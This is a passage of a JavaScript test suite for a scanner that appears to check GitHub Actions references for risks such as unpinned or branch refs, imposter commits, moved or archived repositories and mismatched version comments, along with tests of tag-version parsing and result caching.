    assert.deepEqual(v1.uses, ['other/thing@main', `org/act/sub@${SHA('b')}`], 'its own `$/` at the commit read')
  })

  it('a moving tag where no release of its line is, on no branch, as a repository taken has its tags', async () => {
    assert.deepEqual((await resolve('org/act@v2')).found, ['tag-off-release/high', 'tag-off-branch/low', 'action-missing/moderate'])
  })

  it('a branch, a tag and a branch of one name, neither, and a tag that is no version', async () => {
    assert.deepEqual((await resolve('org/act@main')).found, ['branch-ref/high', 'unpinned-image/high@1'])
    assert.deepEqual((await resolve('org/act@v1', null, { 'org/act': { ...ACT, branches: [...ACT.branches, { branch: 'v1', oid: SHA('e') }] } })).found.slice(0, 1), ['ambiguous-ref/high'])
    assert.deepEqual((await resolve('org/act@nope')).found, ['ref-missing/moderate'])
    assert.deepEqual((await resolve('org/act@latest')).found, ['not-version/moderate', 'unpinned-image/high@1'])
  })

  it('a commit: a release\'s, held to its comment; one no tag names; one in no history of the repository; one GitHub hasn\'t', async () => {
    assert.deepEqual((await resolve(`org/act@${SHA('b')}`, '# v1.1.0')).found, ['unpinned/high@4', 'remote-script/high@6'])
    assert.deepEqual((await resolve(`org/act@${SHA('b')}`, '# v1')).found.slice(0, 1), ['unpinned/high@4'], 'the line of a release on it')
    assert.deepEqual((await resolve(`org/act@${SHA('b')}`, '# v1.0.0')).found.slice(0, 1), ['comment-mismatch/high'])
    assert.deepEqual((await resolve(`org/act@${SHA('c')}`)).found, [], 'action.yaml, where no action.yml is')
    const imposter = await resolve(`org/act@${SHA('f')}`)
    assert.deepEqual(imposter.found, ['imposter-commit/critical', 'action-missing/moderate'])
    assert.deepEqual(imposter.asked.filter(([what]) => what === 'contains').map(([, , base]) => base), [SHA('a'), SHA('b'), SHA('9')],
      'its default branch\'s head, each line\'s latest release, its other branches, each commit once')
    const branches = Array.from({ length: 30 }, (_, at) => ({ branch: `b${at}`, oid: at.toString(16).padStart(40, '7') }))
    assert.deepEqual((await resolve(`org/act@${SHA('f')}`, null, { 'org/act': { ...ACT, branches: [...ACT.branches, ...branches] } })).found.slice(0, 1), ['imposter-commit/critical'], 'every branch listed')
    assert.deepEqual((await resolve(`org/act@${SHA('f')}`, null, { 'org/act': { ...ACT, complete: false } })).found.slice(0, 1), ['unverified-commit/high'], 'where more branches are')
    assert.deepEqual((await resolve(`org/act@${SHA('0')}`)).found, ['commit-missing/high'], 'its code not read')
    const untagged = await resolve(`org/act@${SHA('c')}`, null, { 'org/act': { ...ACT, tags: [] } })
    assert.deepEqual(untagged.found, ['untagged-commit/moderate'])
  })

  it('a reusable workflow\'s `./` call of another, at its own commit', async () => {
    const files = { [`.github/workflows/ci.yml@${SHA('b')}`]: 'on: workflow_call\njobs:\n  a:\n    uses: ./.github/workflows/child.yml\n' }
    const resolved = await resolveAction(readUses(`org/act/.github/workflows/ci.yml@${SHA('b')}`, { job: true }), actionsSourceOf({ 'org/act': { ...ACT, files } }))
    assert.deepEqual(resolved.uses, [`org/act/.github/workflows/child.yml@${SHA('b')}`])
  })

  it('the repository: none, moved, a fork, archived', async () => {
    assert.deepEqual((await resolve('gone/x@v1')).found, ['repo-missing/critical'])
    assert.deepEqual((await resolve('me/private@v1')).found, ['repo-missing/moderate'], 'the same owner\'s, maybe one this access can\'t read')
    const moved = await resolve('old/name@v1', null, { 'old/name': { ...ACT, info: { fullName: 'new/name', defaultBranch: 'main', fork: 'up/stream', archived: true } } })
    assert.deepEqual(moved.found.slice(0, 3), ['repo-moved/high', 'repo-fork/low', 'repo-archived/low'])
    assert.equal(moved.repository.fullName, 'new/name')
  })

  it('kept for a scan, each answer by what was asked, a failure asked again', async () => {
    let asked = 0
    const source = keptSource({ ...actionsSourceOf({ 'org/act': ACT }), tags: () => { asked++; return asked === 1 ? Promise.reject(new Error('busy')) : Promise.resolve(ACT.tags) } })
    await assert.rejects(resolveAction(readUses('org/act@v1'), source), /busy/u)
    await resolveAction(readUses('org/act@v1'), source)
    await resolveAction(readUses('org/act@v2'), source)
    assert.equal(asked, 2)
  })
})

describe('versions of tags', () => {
  it('a release of three parts, a major or minor tag that moves, none else', () => {
    assert.deepEqual(['v4', 'v4.2', '4.2.1', 'v4.2.1-rc.1', 'latest', 'v'].map(tagVersion), [[4, null, null], [4, 2, null], [4, 2, 1], null, null, null])
    const tags = ['v1', 'v1.9.0', 'v2', 'v2.0.0', 'v10.0.1', 'v10', 'nightly'].map(tag => ({ tag, oid: tag }))
    assert.equal(latestOf(tags), 'v10.0.1')
    assert.deepEqual(newestOfLines(tags).map(({ tag }) => tag), ['v10.0.1', 'v2.0.0', 'v1.9.0'])
  })
})
